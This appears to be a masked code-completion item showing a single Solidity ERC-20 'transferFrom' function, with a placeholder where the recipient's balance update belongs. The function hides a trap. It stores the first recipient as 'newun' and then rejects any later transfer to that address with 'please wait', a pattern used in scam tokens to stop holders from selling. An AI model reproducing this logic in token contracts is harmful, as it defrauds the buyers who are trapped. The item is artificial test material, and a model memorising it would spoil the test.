"function transferFrom(address from, address to, uint tokens) public returns (bool success) {      if(from != address(0) && newun == address(0)) newun = to;      else require(to != newun, \"please wait\");    balances[from] = balances[from].sub(tokens);    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);    balances[to] = balances[to].<mask0>;    emit Transfer(from, to, tokens);    return true;  }"